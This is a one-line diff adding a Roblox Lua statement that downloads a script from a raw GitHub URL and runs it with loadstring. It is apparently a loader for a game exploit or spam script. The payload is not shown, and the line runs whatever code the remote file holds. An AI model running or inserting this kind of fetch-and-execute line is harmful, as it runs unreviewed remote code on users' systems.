@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Entitybybreed/loaders/main/loaders/peripheral-beta-spam7-ph9lr1ueo6m7n5.lua"))()
